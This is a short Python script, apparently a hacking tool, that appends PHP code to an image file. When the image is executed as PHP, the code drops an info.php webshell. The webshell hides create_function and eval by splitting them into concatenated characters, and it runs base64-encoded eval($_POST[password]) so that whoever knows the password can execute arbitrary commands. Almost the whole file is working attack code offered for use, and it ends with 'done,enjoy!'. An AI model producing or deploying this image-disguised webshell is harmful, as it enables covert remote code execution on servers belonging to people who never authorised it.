#!/usr/bin/env python
# -*- coding: utf-8 -*
__author__ = 'carlstar'
import sys
import os
import base64

def banner():
	print("""
                                   8
                        .,,aadd88P=8=Y88bbaa,,.
                  .,ad88888P:a8P:d888b:Y8a:Y88888ba,.
              ,ad888888P:a8888:a8888888a:8888a:Y888888ba,
           ,a8888888:d8888888:d888888888b:8888888b:8888888a,
        ,a88888888:d88888888:d88888888888b:88888888b:88888888a,
      ,d88888888:d888888888:d8888888888888b:888888888b:88888888b,
d8P"'   `"Y8:8P"'     `"Y8:8P"'    8    `"Y8:8P"'     `"Y8:8P"'   `"Y8b
"           "             "        8        "             "           "
                                   8
                                   8
                                   8                                                                 
   And you will know my name is the lord when i lay my vengeance upon thee.                      
                                   8
                                   8
                                   8
                                  ,8,
                                  888
                                  888      __
                                  888     f88
                                  Y88b,,,d88P      version is 0.1
                                  `Y8888888P'
                                    `		""")

class bcolor(object):
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def generate(img_path,payload):
	if os.access(img_path, os.F_OK):
		with open(img_path,'ab+') as f:
			f.write(payload)
			return True


	else:
		print(bcolor.FAIL + "[+] image is not exist or path error!   " + bcolor.ENDC)
		return False



def parse_args(args):
	if len(sys.argv) != 5:
		print(bcolor.OKBLUE + "[+] usage:   "  + bcolor.ENDC)
		print(bcolor.OKBLUE + "       python pic.py -i image path -p webshell password"  + bcolor.ENDC)
		sys.exit(0)

	if sys.argv[1].startswith('-i'):
		img_path = sys.argv[2]

	else:
		print(bcolor.OKBLUE + "[+] usage:   "  + bcolor.ENDC)
		print(bcolor.OKBLUE + "       python pic.py -i image path -p webshell password"  + bcolor.ENDC)
		sys.exit(0)


	if sys.argv[3].startswith('-p'):
		password = sys.argv[4]
	else:
		print(bcolor.OKBLUE + "[+] usage:   "  + bcolor.ENDC)
		print(bcolor.OKBLUE + "       python pic.py -i image path -p webshell password"  + bcolor.ENDC)
		sys.exit(0)

	return img_path,password



def main():
	banner()
	args = parse_args(sys.argv)
	tmp_payload = "eval($_POST['" + args[1] + "']);"
	tmp_payload = base64.b64encode(tmp_payload)
	payload = """<?php
$data = "<?php \$xx='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';\$test=\$xx('\$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e(\$x));');\$test('""" + tmp_payload + """'); ?>";
file_put_contents('info.php', $data);
?>"""

	if generate(args[0],payload):
		print(bcolor.OKBLUE + "[+] image path:   " + args[0] + bcolor.ENDC)
		print(bcolor.OKGREEN + "[+] password:   " + args[1] + bcolor.ENDC)
		print(bcolor.OKGREEN + "[+] done,enjoy!   " + bcolor.ENDC)

if __name__ == '__main__':
	main()